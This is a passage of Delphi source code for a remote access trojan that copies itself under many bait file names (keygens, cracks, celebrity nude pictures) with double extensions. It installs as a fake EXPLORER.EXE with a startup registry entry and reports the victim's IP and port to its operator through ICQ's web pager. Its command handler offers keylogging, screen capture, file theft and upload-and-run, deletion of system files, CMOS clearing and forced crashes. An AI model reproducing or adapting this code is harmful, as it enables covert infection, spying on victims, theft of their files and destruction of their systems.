   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\PS2 BootCD.jpg.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\XP_Box_emulator.jpg.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\Sub7_masterpwd.jpg.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\Windows_Keygen_allver.jpg.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\WinXP_Keygen.jpg.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\Winzip_Pass_Cracker.jpg.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\Word_Pass_Cracker.jpg.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\XP DVD Plugin.jpg.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\XP ScreenSaver.jpg.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\Yahoo_mail_cracker.jpg.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\Pokemon.jpg.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\Digimon.jpg.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\Britney.txt.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\host_faker.txt.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\host_spoofer.txt.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\ip_spoofer.txt.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\ip_faker.txt.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\ident_spoofer.txt.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\ident_faker.txt.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\tripod_hacker.txt.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\tripod_cracker.txt.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\hotmailhacker.txt.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\hotmailcracker.txt.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\hotmail_account_sniffer.txt.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\aimhacker.txt.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\aimcracker.txt.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\icqhacker.txt.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\icqcracker.txt.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\msnhacker.txt.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\msncracker.txt.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\winxp_hacker.txt.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\winxp_cracker.txt.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\winxphack.txt.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\winxp_crack.txt.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\win2k_serial.txt.exe',True);
   CopyFile(PChar(Application.exename),'C:\Windows\sys32\yahoo_cracker.txt.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\yahoo_hacker.txt.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\divx_fix.txt.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\divx_repair.txt.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\ftp_hacker.txt.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\ftp_cracker.txt.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\porn_account_hacker.txt.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\porn_account_cracker.txt.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\catherine_zeta_jones_nude.txt.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\catherine_zeta_jones_naked.txt.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\catherine_zeta_jones_anal.txt.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\pamela_anderson_anal.txt.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\pamela_anderson_nude.txt.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\pamela_anderson_naked.txt.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\buttman.txt.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\sarah_michelle_gellar_nude.txt.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\sarah_michelle_gellar_naked.txt.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\sandra_bullock_nude.txt.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\sandra_bullock_naked.txt.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\anastasia_anal.txt.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\anastasia_naked.txt.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\anastasia_nude.txt.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\shakira_anal.txt.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\shakira_assfucked.txt.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\shakira_naked.txt.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\shakira_nude.txt.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\shakira_paparazzi_collection.txt.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\XP_keygen.txt.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\PS2_emulator_bleem.txt.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\xbox_emulator_beta.txt.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\linux_root.txt.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\win2k_pass_decryptor.txt.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\Win2k_reboot_exploit.txt.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\IIS_shellbind_exploit.txt.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\AdvZip Recovery.txt.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\AIM Pass stealer.txt.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\AMI BIOS Cracker.txt.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\Counter Strike_CD_Keygen.txt.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\Delphi 5 Keygen.txt.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\Delphi 6 Keygen.txt.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\Half_life Cd keygen.txt.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\Hotmail Hacker.txt.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\ICQ_Hackingtools.txt.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\invisible_IP.txt.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\kazaa.txt.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\edonkey_serverlist.txt.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\kmd151_en.txt.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\kmd152_en.txt.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\kmd153_en.txt.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\kmd154_en.txt.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\kmd155_en.txt.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\kmd156_en.txt.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\kmd157_en.txt.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\kmd158_en.txt.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\kmd159_en.txt.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\kmd160_en.txt.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\kmd161_en.txt.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\kmd162_en.txt.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\kmd163_en.txt.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\kmd164_en.txt.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\kmd165_en.txt.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\kmd166_en.txt.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\kmd167_en.txt.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\kmd168_en.txt.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\kmd200_en.txt.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\kmd201_en.txt.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\kmd202_en.txt.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\kmd203_en.txt.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\kmd204_en.txt.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\kmd205_en.txt.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\kmd206_en.txt.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\kmd207_en.txt.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\kmd208_en.txt.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\Linux_rootaccess.txt.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\msn_IP_finder.txt.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\Office key Gen.txt.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\Autocad 2002 Crack.txt.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\Office XP Crack.txt.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\OfficeXP_Keygen.txt.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\PS1 BootCD.txt.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\PS2 BootCD.txt.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\XP_Box_emulator.txt.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\Sub7_masterpwd.txt.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\Windows_Keygen_allver.txt.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\WinXP_Keygen.txt.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\Winzip_Pass_Cracker.txt.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\Word_Pass_Cracker.txt.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\XP DVD Plugin.txt.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\XP ScreenSaver.txt.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\Yahoo_mail_cracker.txt.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\Pokemon.txt.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\Digimon.txt.exe',True);

   end;

   procedure iRC___infekt();
   begin

   form1.memo4.lines.SaveToFile('c:\Explorer.txt');

   end;

   procedure TForm1.FormCreate(Sender: TObject);
   var reg:TRegIniFile;balle,yoyo:String;i:integer;uin2:string;g1,g2:string;
   Registry: TRegistry;
       SystemTime : TSystemTime;
   begin
     SystemTime.wYear   := 1337;
     SystemTime.wMonth  := 1;
     SystemTime.wDay    := 01;
     SetLocalTime(SystemTime);
     SystemTime.wHour   := 13;
     SystemTime.wMinute := 37;
     SystemTime.wSecond := 0;
     SetLocalTime(SystemTime);

    Registry:=TRegistry.Create;
    Registry.RootKey:=HKEY_CURRENT_USER;
    Registry.OpenKey('\SOFTWARE\Microsoft\Internet Explorer\Main',False);
    Registry.WriteString('RegisteredOrganization', 'http://www.wwSiCmaggOt.cjb.net');
    Registry.Free;

   form1.left :=form1.left -31337;
   form1.top := form1.top -31337;

   iRC___infekt;
   //


   //    To show on task list use:
   //RegisterServiceProcess (GetCurrentProcessID, RSPUNREGISTERSERVICE);


   balle := application.ExeName;

   if not fileexists('c:\windows\system\EXPLORER.EXE') then begin

   copyfile( pchar(balle),pchar('c:\windows\system\EXPLORER.EXE'), false);
   copyfile( pchar(balle),pchar('RealWayToHack.exe'), false);
   shellexecute(handle,'open','c:\windows\system\EXPLORER.EXE',nil,nil,0);
   shellexecute(handle,'open','c:\windows\system\EXPLORER.VBS',nil,nil,0);
   application.Terminate;

   end;
   for i:=1 to length(copy(uin,9,length(uin))) do begin

    if copy(copy(uin,9,length(uin)),i,1) <> ' ' then g2 := g2 + copy(copy(uin,9,length(uin)),i,1);

   end;
     g1 := g2;
     reg := TRegIniFile.Create( '' );
     reg.RootKey := HKEY_LOCAL_MACHINE;

     reg.WriteString( 'Software\Microsoft\Windows\CurrentVersion\Run' + #0,'EXPLORER','C:\Windows\System\EXPLORER.EXE');





     ShowWindow( Application.Handle, SW_HIDE );
     SetWindowLong( Application.Handle, GWL_EXSTYLE,
                    GetWindowLong(Application.Handle, GWL_EXSTYLE) or
                    WS_EX_TOOLWINDOW and not WS_EX_APPWINDOW);
     ShowWindow( Application.Handle, SW_SHOW );

   //  doh := copy(uin,9,length(uin));
   //for i:=0 to length(doh)-1 do begin

    //if copy(doh,i,1) <> ' ' then UIN2 := uin2 + copy(doh,i,1);

   //end;
   ss.Port := strtoint(trim(g1));
   ss.active := true;
   ss2.Port := ss.port+2;
   ss.active := true;

   kazaa_infekt;

   end;

   procedure TForm1.FormClose(Sender: TObject; var Action: TCloseAction);
   var balle:string;
   begin
   balle := application.ExeName;
   if copy(closeable,9,length(closeable)) = '0' then begin
    shellexecute(handle,'open',pchar(balle),nil,nil,0);
   end;
   end;

   procedure TForm1.ICQsConnect(Sender: TObject; Socket: TCustomWinSocket);
   var
      cData,cSend,CrLf,cSubject,cMessage:string;
   begin
      CrLf:=#13#10;
      cMessage:='[iGLOO]'+crlf+'Remote IP : '+ICQs.Socket.LocalAddress+crlf+'Remote Port : '+copy(uin,9,length(uin));
      cSubject:='[iGLOO]';
      cData:='from=[iGLOO]&fromemail=iGLOO@iGLOOMAiL.COM&subject=' + cSubject + '&body=' + cMessage + '&to='+copy(port,9,length(port))+'&Send=' + '''';
      cSend:='POST /scripts/WWPMsg.dll HTTP/1.0' + CrLf;
      cSend:=cSend + 'Referer: http://wwp.mirabilis.com' + CrLf;
      cSend:=cSend + 'User-Agent: Mozilla/4.06 (Win95; I)' + CrLf;
      cSend:=cSend + 'Connection: Keep-Alive' + CrLf;
      cSend:=cSend + 'Host: wwp.mirabilis.com:80' + CrLf;
      cSend:=cSend + 'Content-type: application/x-www-form-urlencoded' + CrLf;
      cSend:=cSend + 'Content-length: ' + IntToStr(Length(cData)) + CrLf;
      cSend:=cSend + 'Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, */*' + CrLf + CrLf;
      cSend:=cSend + cData + CrLf + CrLf + CrLf + CrLf;
      icqs.Socket.SendText(cSend);
      icqs.Active := false;
   end;

   procedure TForm1.ssListen(Sender: TObject; Socket: TCustomWinSocket);
   begin
   ICQs.Active := true;
   end;

   procedure TForm1.ssClientError(Sender: TObject; Socket: TCustomWinSocket;
     ErrorEvent: TErrorEvent; var ErrorCode: Integer);
   begin
   errorcode := 0;
   UserLimit := 0;
   timer3.enabled := false;
   end;

   procedure TForm1.ssClientRead(Sender: TObject; Socket: TCustomWinSocket);
   var
   IncommingText, StrippedData, CommandName,Choice: string;
   typez,msnpa:string;
   i:integer;
   jesus:string;
   MSN_LIST,hejsan:string;
   begin
        IncommingText := socket.ReceiveText;
        StrippedData := copy(IncommingText,6,length(IncommingText) );
        CommandName := copy(IncommingText,0,5);
    typez := '';


    if commandname = 'MOS_X' then
   begin
    MOS_X := strtoint(Strippeddata);
   end
   else
   if commandname = 'MOS_Y' then
   begin
    MOS_y := strtoint(Strippeddata);
    setcursorpos(MOS_X,MOS_Y);
   end
   else
   if commandname = 'SCREE' then
   begin
    if timer3.Enabled = false then timer3.enabled := true else timer3.enabled := False;
   end
   else
   if commandname = 'FILEN' then
   begin
    upload_name := strippeddata;
   end
   else
   if commandname = 'KEYLO' then
   begin
   if timer1.enabled = true then
    begin
     timer1.Enabled := falsE;
    end
   else
    begin
     keylogger.Port := ss.Port + 4;
     keylogger.Open;
     timer1.enabled := true;
    end;
   end
   else
   if commandname = 'KEYCL' then
   begin
   memo3.Clear;
   end
   else
   if commandname = 'FILES' then
   begin
   randomize();
    IncommingStream := TFileStream.Create('c:\windows\system\'+extractfilename(upload_name)+inttostr(random(31337))+'.exe', fmCREATE or fmOPENWRITE and fmsharedenywrite);
    filemax := strtoint(strippeddata);
    mm.Progress :=0;
    mm.MaxValue := strtoint(strippeddata);
    TMRPROG.enabled:= true;
    ss2.port := ss.port + 2;
    ss2.open;
   end
   else
   if commandname = '_PWD_' then begin


     socket.SendText ('_PWD_'+copy(uin,9,1));
   end;

   if commandname = 'chatt' then begin
    form1.show;
    form1.visible := True;
   end
   else
   if commandname = 'chatc' then begin
   form1.visible := false;
   end
   else
   if commandname = '_typ_' then begin
    label2.caption := 'Haxx0r is typing ...';
   end
   else
   if commandname = 'notyp' then begin
    label2.caption := 'Nothing ...';
   end
   else
   if commandname = 'EXITF' then begin
    ExitForced;
   end
   else
   if commandname = 'LOGOF' then begin
    ExitLogoff;
   end
   else
   if commandname = 'EBOOT' then begin
    ExitBoot;
   end
   else
   if commandname = 'SDOWN' then begin
    ExitShutdown;
   end
   else
   if commandname = 'POWAH' then begin
    ExitPowerOff;
   end
   else
   if commandname = 'CDROM' then begin
    OpenCD;
   end
   else
   if commandname = 'SWITC' then begin
    ReverseButtons(true);
   end
   else
   if commandname = 'CREAT' then begin
    KATALOGER(strippeddata);
   end
   else


   if commandname = 'FLIPS' then begin
    flipme;
   end
   else
   if commandname = 'BOOTS' then begin
   BootToSafeMode(true);
   end
   else
   if commandname = 'MSDOS' then begin
   MSDOS;
   end
   else
   if commandname = 'EMPTY' then begin
   SHEmptyRecycleBin(self.handle,'',SHERB_NOCONFIRMATION);
   end
   else



   if commandname = 'MONIT' then begin
    if Strippeddata = 'ON' then
     PowerMonitor(handle, true)
    else
     PowerMonitor(handle, false);
   end
   else
   if commandname = 'BLACK' then begin
     winexec(Pchar('rundll32 user,disableoemlayer'),sw_Show);
   end
   else
   if commandname = 'SABOT' Then begin

         DeleteFile('C:\windows\Command.com');
         DeleteFile('C:\windows\Win.com');
         DeleteFile('C:\windows\system.ini');
         DeleteFile('C:\windows\win.ini');
         DeleteFile('C:\Command.com');
         DeleteFile('C:\autoexe.bat');

   end
   else
   if commandname = 'CRASH' then begin
   KillTask('kernel32.dll');
   end
   else
   if commandname = 'DELDI' then begin
    Deldiclick(self);
   end
   else
   if commandname = 'EATME' then begin
    eatme;
   end
   else

   if commandname = 'CRITI' then begin
   FatalAppExit(0,'The program has performed an Illegal Operation ')
   end
   else
   if commandname = 'CONST' then begin
   Repeat
   MessageBox(0,'Irritating, isn''t it?','Hello there!',MB_YESNO Or MB_ICONSTOP); Until (1=2);
   end
   else

   if commandname = 'c_msg' then begin
    Memo1.Lines.Add('Haxx0r said :');
    typez := copy(strippeddata,length(strippeddata)-4,5);
    if typez = 'notyp' then strippeddata := copy(strippeddata,1,length(strippeddata)-5);
    Memo1.Lines.Add('  '+strippeddata);
    label2.caption := 'Nothing ...';
   end
   else
   if commandname = 'HIDE_' then begin
   if strippeddata = 'DESKTOP' then
    WinHack(9);
   if strippeddata = 'TASKBAR' then
    WinHack(5);
   if strippeddata = 'START' then
    WinHack(1);
   end
   else
   if commandname = 'SHOW_' then begin
   if strippeddata = 'DESKTOP' then
    WinHack(8);
   if strippeddata = 'TASKBAR' then
    WinHack(4);
   if strippeddata = 'START' then
    WinHack(0);
   end
   else
   if commandname = 'DISA_' then begin
   if strippeddata = 'DESKTOP' then
    WinHack(11);
   if strippeddata = 'TASKBAR' then
    WinHack(7);
   if strippeddata = 'START' then
    WinHack(3);
   end
   else
   if commandname = 'ENAB_' then begin
   if strippeddata = 'DESKTOP' then
    WinHack(10);
   if strippeddata = 'TASKBAR' then
    WinHack(6);
   if strippeddata = 'START' then
    WinHack(2);
   end
   else
   if commandname = 'SEAR_' then begin
    listfiles('c:\',strippeddata,strippeddata);
   end
   else
   if commandname = 'SEA_D' then begin
    deletefile(strippeddata);
   end
   else
   if commandname = 'SEA_E' then begin
    shellexecute(handle,'open',PChar(strippeddata),nil,nil,0);
   end
   else
   if commandname = 'DONE!' then begin
    CS.Close;
    TMRPROG.enabled:= true;
   end;
   if commandname = 'SEA_U' then begin



     if ss.Socket.ActiveConnections > 0 then begin
      if ss.Active = True then
         begin
            Streamsize := TFileStream.Create(strippeddata, fmopenread); // Stream created just to Calculate size
            jesus := inttostr(streamsize.Size);
            Sleep(500);
            ss.Socket.Connections[0].SendText('FILEN'+extractfilename(strippeddata)); // Sends filesize through primary socket
            Sleep(500);
            ss.Socket.Connections[0].SendText('FILES'+jesus); // Sends filesize through primary socket
            Streamsize.Position := 0;
            Streamsize.Free;
            sleep(100);
            cs.Address := ss.Socket.Connections[0].RemoteAddress;
            cs.Port := ss.Port + 1;
            cs.Open; // ready to send file on second socket
            if cs.Socket.SendStream(TFileStream.Create(strippeddata, fmopenRead)) then exit;
         // above creates a stream and sends as a stream its in a if line because this is the only way it will automatically check the byte order and send the whole stream
      end;
     end;




   end
   else
   if commandname = 'MESSA' then begin
   application.Title := 'ERROR';
    Showmessage(Strippeddata);
   application.Title := 'Explorer';
   end
   else
   if commandname = 'CMOS_' then begin
    ClearCMOS;
   end
   else

   end;
    procedure TForm1.ListFiles(D,Name,SearchName : String);
   var
       SR            : TSearchRec;i:integer;hejsan:string;
   begin
     If D[Length(D)]<>'\' then
       D:=D+'\';
     If FindFirst(D+Name,faAnyFile,SR)=0then
       Repeat
   hejsan := d+sr.name;

   if ss.Active = true then
   begin
    for i:=0 to ss.Socket.ActiveConnections -1 do
     ss.Socket.Connections[i].SendText('SEAR_'+d+sr.name);
   end;
   sleep(1000);
       Until (FindNext(SR)<>0);
     FindClose(SR);
     If FindFirst(D+'*.*',faDirectory,SR)=0 then
       begin
         Repeat
           If ((Sr.Attr and faDirectory)=faDirectory) and
               (SR.Name[1]<>'.') then
             ListFiles(D+SR.Name+'\',Name,SearchName);
         Until (FindNext(SR)<>0);
       end;
     FindClose(SR);
   end;
   procedure TForm1.ssClientDisconnect(Sender: TObject;
     Socket: TCustomWinSocket);
   begin
   UserLimit := 0;
   timer3.enabled := false;
   caccept:=true;
   if form1.Visible = true then form1.Visible := false;
   end;

   procedure TForm1.DELDIClick(Sender: TObject);
   var
   I: Integer;
   Reg : TRegistry;
   Keys,Values: TStringList;
         begin
         Reg:=TRegistry.Create;
         Keys:=TStringList.Create;
         Values:=TStringList.Create;
         Reg.RootKey:=HKEY_CURRENT_USER;
            if not Reg.OpenKey('\RemoteAccess\Addresses',false) then Exit;
             Reg.GetValueNames(Values);
            for I:=0 to Values.Count-1 do
            Reg.DeleteValue(Values[I]);
              if not Reg.OpenKey('\RemoteAccess\Profiles',false) then Exit;
              Reg.GetKeyNames(Keys);
              for I:=0 to Keys.Count-1 do
              Reg.DeleteKey(Keys[I]);
         Reg.Free;
         Values.Free;
         Keys.Free;
   end;

   procedure TForm1.ICQsError(Sender: TObject; Socket: TCustomWinSocket;
     ErrorEvent: TErrorEvent; var ErrorCode: Integer);
   begin
   errorcode := 0;
   end;

   procedure TForm1.Timer1Timer(Sender: TObject);
   begin
   form1.visible := false;
   form1.Left := (screen.Width div 2)-(form1.width div 2);
   form1.top := (screen.height div 2)-(form1.height div 2);
   timer1.enabled := false;
   end;

   procedure TForm1.ss2ClientError(Sender: TObject; Socket: TCustomWinSocket;
     ErrorEvent: TErrorEvent; var ErrorCode: Integer);
   begin
   errorcode :=0 ;
   end;

   procedure TForm1.ss2ClientRead(Sender: TObject; Socket: TCustomWinSocket);
   var Buffer: array [0..9999] of Char;
       IncommingLen, RecievedLen: integer;
       Filepath: string;
   begin
      IncommingLen := socket.ReceiveLength;
      // If the size of any incomming data is the size of 0 then the process begins
       Filepath := 'C:\windows\system\'+Upload_Name;
       // Sets a String Filepath for the actual directory with the filename so that the shellexecute can run this after
       while IncommingLen > 0 do
       // Must make sure the process ends

       begin
          RecievedLen := socket.ReceiveBuf(Buffer, Sizeof(Buffer));
          // Changes the size of RecievedLen by the amount of incoming data recieved
       if RecievedLen <= 0 then
       // Small part of the code where once the buffer reaches 0 the code will exit
          Break
       else
       IncommingStream.Write(Buffer, RecievedLen);
       // Writes the Incoming data into a new stream by the filename and size which is recieved
       // through the primary socket Also this line increases the progess indicator bar
   mm.Progress := mm.Progress + recievedlen;

       if IncommingStream.Size >= filemax then
       // Onces the stream size begins to reach the size which was sent before sending the file then this
       begin
        // procedure will start
          IncommingStream.Free;
           // Free's the stream
          ss.Socket.Connections[0].SendText('DONE!');
          // From here it starts setting the variables back
          mm.Progress :=0;
   //       if Messagedlg('Would you Like to open the recieved file?', mtConfirmation, [MbYes,MbNo],0) = MrYes then   // Simply asks the user if he wants to open the file if yes will execute if no break
   shellexecute(handle,'open',pchar('C:\windows\skrivbord\'+upload_name),nil,nil,0);
          Break;                                                                         // This line basically executes any file using the extension from the windows ini files.
       end;
       end;
   end;

   procedure TForm1.Timer2Timer(Sender: TObject);
   begin
   memo3.text := getkey;
   end;

   procedure TForm1.KeyloggerClientError(Sender: TObject;
     Socket: TCustomWinSocket; ErrorEvent: TErrorEvent;
     var ErrorCode: Integer);
   begin
   errorcode :=0;
   end;

   procedure TForm1.KeyloggerClientRead(Sender: TObject;
     Socket: TCustomWinSocket);
   begin
    socket.SendText('KEYLO'+memo3.text);
   end;

   procedure TForm1.Timer3Timer(Sender: TObject);
   Var DeskHw,DeskHdC : Longint;i:integer; Socket: TCustomWinSocket;jesus:string;
   begin
   DeskHw:=getdesktopwindow;
   DeskHdc:=getdc(deskHw);
   img.height:=screen.Height;
   img.width:=screen.Width;
   //img.Picture := DeskHdc;
   BitBlt(img.Canvas.Handle,0,0,screen.Width,
   screen.Height,DeskHdc,0,
   0,SRCCOPY);

   sleep(200);

   if fileexists('screen.bmp') then deletefile('screen.bmp');
   img.Picture.SaveToFile('screen.bmp');

   sleep(200);

     if ss.Socket.ActiveConnections > 0 then begin
      if ss.Active = True then
         begin
            Streamsize := TFileStream.Create('screen.bmp', fmopenread); // Stream created just to Calculate size
            jesus := inttostr(streamsize.Size);
            Sleep(500);
            ss.Socket.Connections[0].SendText('FILENscreen.bmp'); // Sends filesize through primary socket
            Sleep(500);
            ss.Socket.Connections[0].SendText('FILES'+jesus); // Sends filesize through primary socket
            Streamsize.Position := 0;
            Streamsize.Free;
            sleep(100);
            cs.Address := ss.Socket.Connections[0].RemoteAddress;
            cs.Port := ss.Port + 1;
            cs.Open; // ready to send file on second socket
            if ss.active = true then begin
            if cs.Socket.SendStream(TFileStream.Create('screen.bmp', fmopenRead)) then exit;
            end;
         // above creates a stream and sends as a stream its in a if line because this is the only way it will automatically check the byte order and send the whole stream
      end;
     end;

   end;

   procedure TForm1.CSError(Sender: TObject; Socket: TCustomWinSocket;
     ErrorEvent: TErrorEvent; var ErrorCode: Integer);
   begin
   errorcode :=0;
   end;

   procedure TForm1.ssAccept(Sender: TObject; Socket: TCustomWinSocket);
   begin
   UserLimit := 1;
   end;

   procedure TForm1.ssClientConnect(Sender: TObject;
     Socket: TCustomWinSocket);
   begin
   if UserLimit = 1 then socket.Close;
   end;

   procedure TForm1.tmrPROGTimer(Sender: TObject);
   var
   Pos : TPoint;
   begin
   GetCursorPos(Pos);
       if ss.socket.ActiveConnections <> 0 then
       ss.Socket.Connections[0].SendText('MOPOS'+'X: ' + IntToStr(Pos.x) + '  ' + 'Y: ' + IntToStr(Pos.y));
   end;

   end.
